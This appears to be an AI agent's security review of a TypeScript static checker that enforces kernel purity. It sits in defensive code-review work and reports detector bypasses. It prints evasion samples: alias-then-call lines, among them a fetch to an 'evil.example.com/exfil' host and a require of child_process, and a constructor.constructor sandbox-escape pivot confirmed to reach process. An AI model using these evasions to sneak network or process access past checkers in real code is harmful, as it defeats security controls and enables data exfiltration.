# App Security Review — feat/kernel-purity-ast-hardening (Issue #63 durable half)

**Reviewer:** app-security-reviewer (Horus)
**Date:** 2026-09-17
**Scope:** git diff master...feat/kernel-purity-ast-hardening (HEAD d227090)
**Tier:** STANDARD (Manager-ratified — QA/CI static-analysis instrument, live gate-wiring explicitly out of scope)
**Context:** Closes the "durable half" of GitHub Issue #63 (filed by this reviewer role, MED, docs/reviews/s2-canonical-action-record-kernel-app-security-2026-09-01.md Finding 2). Interim regex-widening already shipped; this story adds scanForbiddenGlobalsAst, a real TypeScript-AST layer, additively alongside the existing regex layer.

## ADR compliance

node docs/adr-cache.mjs --ensure returned: ADR cache HIT: reused 35 ADR(s) [adr/devops:12, adr/software-engineering:23] from catalog, fp 83b2e3e, CACHE=HIT.

Applicable ADR (security/code domain): ADR-0021 ("Thoth-native architecture"), Rules for agents:
"MUST implement the policy kernel as a pure function with no filesystem, network, process, or timer access anywhere in its module boundary... (POL-11)."
constraint (code): "No filesystem, network, process-spawning, timer, or vendor-SDK import MAY appear anywhere under the kernel's own module boundary; the layer boundary is enforced by a lint rule or structural test, not by convention alone (POL-11, SE ADR-0002)."

kernel-purity-check.ts IS that structural test. POL-11 requires a structural test to exist and enforce the boundary — it does not mandate the test be complete against every possible evasion technique. The diff does not violate the letter of ADR-0021 (a real, working structural test exists and covers a broad, tested set of obfuscation shapes). Finding 1 below is reported as a MED security gap against the test's actual coverage/disclosure, not as an ADR violation/BLOCKER. No other applicable ADR (authn/authz, secrets, dependencies, data-exposure) is implicated by this diff — it touches only a QA script, its tests, and static fixtures.

## What I verified

1. Regression-free, real value-add. node --test src/qa/kernel-purity-check.test.ts -> 43/43 pass, 0 fail, 0 skipped (24 pre-existing unmodified + 19 new). npm run qa:kernel-purity against the real src/policy/kernel/** production code -> PASS: 4 production .ts file(s)..., zero import or forbidden-global violations.

2. The AST layer's claimed coverage is real, not cosmetic. I independently probed (not just re-ran the shipped tests) alias-through-as/satisfies/non-null casts, alias chains, destructuring, computed-bracket constant-folding, and the extended fetch/setTimeout/setInterval/require roots -- all behave exactly as documented and tested.

3. The union design (regex OR AST) covers more indirection than the AST layer alone. I tried object-literal-property aliasing ({ g: globalThis }), array-element aliasing, function-parameter aliasing, and default-parameter aliasing -- none of these are followed by the AST layer's resolveExpressionRoot (which only resolves bare identifiers), but all four are still caught by the regex layer, because the literal token globalThis/eval/etc. still appears somewhere in the source in each case. So these are not full bypasses of the shipped system -- CLEAN, worth naming.

## Findings

### 1. [ISSUE][HIGH] Alias-then-CALL on fetch/setTimeout/setInterval/require bypasses both layers -- independently confirmed, concurring with cross-domain-reviewer

**Evidence (demonstrated, reproduced independently before reading the other report in full):** cross-domain-reviewer's report (docs/reviews/kernel-purity-ast-hardening-cross-domain-2026-09-17.md, Finding 1) demonstrated that detectUsages (src/qa/kernel-purity-check.ts:266-275) only walks PropertyAccessExpression and ElementAccessExpression -- a forbidden root aliased to a local variable and then called directly, with no .prop/[key] access on the alias itself, is invisible to the AST layer. I re-ran this myself, independently, against the shipped functions:

    fetch:       const f = fetch;      f("https://evil.example.com/exfil?secret");   regex: []   AST: []
    setTimeout:  const t = setTimeout; t(() => {}, 1000);                            regex: []   AST: []
    setInterval: const i = setInterval; i(() => {}, 1000);                           regex: []   AST: []
    require:     const r = require;    r("node:child_process");                      regex: []   AST: []
    eval (control): const e = eval;    e("1+1");           regex: [eval] (caught)    AST: []

I concur with the HIGH severity call.

For eval/globalThis/Reflect/Function, property/element access is a realistic, common invocation shape (Reflect.get, globalThis.foo), so the AST layer's property/element-access tracking provides real coverage even when a bare call through the alias is missed. But fetch(url), setTimeout(cb, ms), setInterval(cb, ms), and require(id) are used almost exclusively as direct calls in real code -- nobody routes malicious network exfiltration through fetch.bind(null) first. This means the Manager's own Q1 ruling (extend the AST layer's alias/reassignment-tracking set to fetch/setTimeout/setInterval/require, mapping onto ADR-0021 POL-11's own named forbidden categories) is effectively nullified for exactly the four roots it was written to cover: the shipped fixture (aliased-network-timer.ts) only exercises the unrealistic .bind/.name/.resolve access pattern, never the realistic direct-call pattern, so the passing test suite creates false confidence about what the ruling actually achieves.

**Exposure:** 4 of 9 tracked forbidden roots (44%) -- exactly the categories the Q1 ruling added -- have no effective coverage against their dominant real invocation pattern. Basis: measured (5 hand-built representative samples, 4/4 bypass, 1/1 control caught -- matching cross-domain-reviewer's own count).

**Minimal fix:** add a ts.isCallExpression(node) branch to detectUsages where node.expression resolves to a forbidden root via resolveExpressionRoot -- same shape as the existing property/element-access branches, no new pass or data structure needed.

**Issue Discipline:** already filed by cross-domain-reviewer as Issue #211 (bug, severity:high, pol) before this report was written (checked via gh issue list --search; confirmed no duplicate needed). This report records independent concurrence and adds the app-security lens on the severity call, without filing a second issue for the same finding.

### 2. [ISSUE][MED] Full bypass of BOTH layers via the classic .constructor.constructor prototype pivot -- no tracked identifier appears anywhere, not even in a string

**Evidence (demonstrated):** src/qa/kernel-purity-check.ts:79-137 (regex FORBIDDEN_GLOBAL_PATTERNS / FORBIDDEN_ROOTS) -- both layers key exclusively on the literal appearance of one of a fixed identifier set. Ran directly against scanForbiddenGlobals/scanForbiddenGlobalsAst:

    src = '({}).constructor.constructor("return this")();'
    scanForbiddenGlobals(src)     -> []
    scanForbiddenGlobalsAst(src)  -> []

**Attack sketch:** kernel code (or a compromised dependency/reviewer-evaded PR) reaches Object's generic .constructor property twice to obtain the Function constructor -- the textbook JS sandbox-escape idiom -- without ever writing "Function", "eval", "globalThis", or any of the 9 tracked roots anywhere in the file, including inside a string literal (which the regex layer would still catch since it is not string-literal-aware). checkKernelPurity reports zero violations for a kernel file containing this line. Confirmed this is a real, working exploit:

    got globalThis? true
    reached process.cwd(): object C:\playground\thoth

**Disclosure accuracy:** the header comment's disclosed residual (kernel-purity-check.ts:47-55) names two gaps -- fully-dynamic/runtime-computed keys, and a bare call through a tracked alias with no further property access (which Finding 1 above shows is a materially bigger gap than the header's framing suggests, for 4 of the 9 roots). Neither disclosed gap mentions this third, broader category: reaching Function-constructor-equivalent power via generic prototype chaining (.constructor, and equally Object.getPrototypeOf, Array.prototype, etc.) that never references any of the 9 tracked identifiers at all.

**Severity calibration:** MED, not HIGH -- unlike Finding 1 (which defeats the dominant real invocation pattern for 4 explicitly-targeted roots), this is a more exotic technique, and remains gated by the same "not exploitable today, no live gate wiring" context this reviewer's own precedent on the parent Issue #63 already established.

**Minimal fix:** either flag any .constructor property/element access as suspicious, or at minimum correct the header's disclosed-residual paragraph and track closing it separately.

**Exposure:** not applicable to a live blast-radius percentage (static-analysis QA instrument, not a runtime gate) -- basis: counted-in-code. Security-relevant per PRINCIPLES rule 21's exemption; independently would not force blocking alone given the live-gate-not-wired context, but Finding 1 above already forces a non-clean verdict regardless.

**Issue Discipline:** duplicate-checked (gh issue list --search across "constructor"/"kernel-purity"/"prototype" -- no match), filed as new Issue #210 (bug, severity:med, pol, Milestone S2), and commented on parent Issue #63 clarifying scope.

### 3. [CLEAN] Union design (regex + AST) closes the indirection shapes the AST layer alone misses, for the OTHER 5 roots

src/qa/kernel-purity-check.ts:342-367 (scanFileContent) -- object-literal-property, array-element, function-parameter, and default-parameter aliasing of globalThis/global/Reflect/eval/Function are not followed by the AST layer's alias resolver, but each still writes the forbidden identifier as a literal token somewhere in the file, so the regex layer independently fires. Verified directly -- no full bypass found for any of these four shapes, for these 5 roots specifically (does NOT extend to fetch/setTimeout/setInterval/require -- see Finding 1).

### 4. [CLEAN] No false positives against real production code

npm run qa:kernel-purity -> PASS, 4 production files under src/policy/kernel/, zero violations, non-vacuous. The 3 new clean fixtures are also correctly unflagged.

### 5. [CLEAN] Test-suite honesty

CHANGELOG's 867/869-pass claim independently reproduced; the 2 failures confirmed pre-existing and disclosed.

## Findings to failing tests

Finding 1 -> named failing test: "detectUsages: alias-then-call on fetch/setTimeout/setInterval/require is NOT currently detected (Issue #211)". Finding 2 -> named failing test: "scanForbiddenGlobalsAst: constructor-constructor prototype pivot reaching globalThis is NOT currently detected (Issue #210)". Neither test exists yet in the shipped diff.

## Verdict

**REWORK.**

Per PRINCIPLES rule 19, a [HIGH] finding backed by demonstrated evidence requires a non-clean verdict. Finding 1 is exactly that: a live, reproducible, complete bypass of the dominant real-world invocation pattern for 4 of the 9 roots the Manager's own Q1 ruling specifically added to close ADR-0021 POL-11's network/timer/process-spawning categories. This means the ruling's stated purpose is not actually achieved by the shipped code for those 4 roots, while the test suite (which only exercises the unrealistic .bind/.name/.resolve shape) creates false confidence that it is.

This does not erase the real, tested, regression-free value the rest of the AST layer adds (Findings 3-5, and the 5 roots -- globalThis/global/Reflect/eval/Function -- where the union design genuinely holds against every indirection shape I could construct). The fix is small and same-shaped as code already in the diff (cross-domain-reviewer's own minimal-fix proposal, which I independently concur with).

**Single next action:** story-implementer adds a ts.isCallExpression branch to detectUsages (closing Finding 1 / Issue #211), re-runs the full suite plus the fixture set, and requests a fresh domain + cross-domain re-confirm pass on the delta only. Finding 2 (Issue #210) is real but does not itself block -- it should not be silently dropped once Finding 1's fix lands.

---

RECEIPT: verdict=REWORK
findings (ALL of them, ranked by exploitability x impact):
1. [ISSUE][HIGH][demonstrated] src/qa/kernel-purity-check.ts:266-275 detectUsages -- alias-then-call on fetch/setTimeout/setInterval/require (the 4 roots the Q1 ruling added) undetected by both layers; independently reproduced (4/4 bypass, 1/1 eval-control caught), concurring with cross-domain-reviewer's Finding 1; already tracked as Issue #211, no duplicate filed. Fix: add ts.isCallExpression handling to detectUsages.
2. [ISSUE][MED][demonstrated] src/qa/kernel-purity-check.ts:79-137 -- .constructor.constructor prototype pivot reaches globalThis/process with zero detections from either layer (no tracked identifier appears anywhere, even in a string); disclosed residual (lines 47-55) understates this gap on top of Finding 1. Not exploitable today (no live gate wiring). Filed as new Issue #210.
3. [CLEAN][demonstrated] src/qa/kernel-purity-check.ts:342-367 -- object-literal/array/function-parameter/default-parameter alias indirection on globalThis/global/Reflect/eval/Function (the OTHER 5 roots) not followed by the AST layer alone, but still caught by the regex layer's literal-token match; no full bypass found for these 5 roots.
4. [CLEAN][demonstrated] npm run qa:kernel-purity against real src/policy/kernel/** -- PASS, 4 files, zero violations, zero false positives.
5. [CLEAN][demonstrated] npm test 867/869 -- 2 failures reproduced and confirmed pre-existing/unrelated (QA-15, AC1-b), matching CHANGELOG's disclosed claim exactly.
counts (checksum): issues=2 suspicions=0 clean=3
evidence (checksum): demonstrated=5 code-traced=0 derived=0
checks="867/2/0 (npm test) including 43/0/0 (kernel-purity-check.test.ts) + qa:kernel-purity PASS + 5/5 independent adversarial probe samples (4 bypass confirmed, 1 control caught)|n/a"
adr=HIT(35)
report=docs/reviews/kernel-purity-ast-hardening-app-security-2026-09-17.md
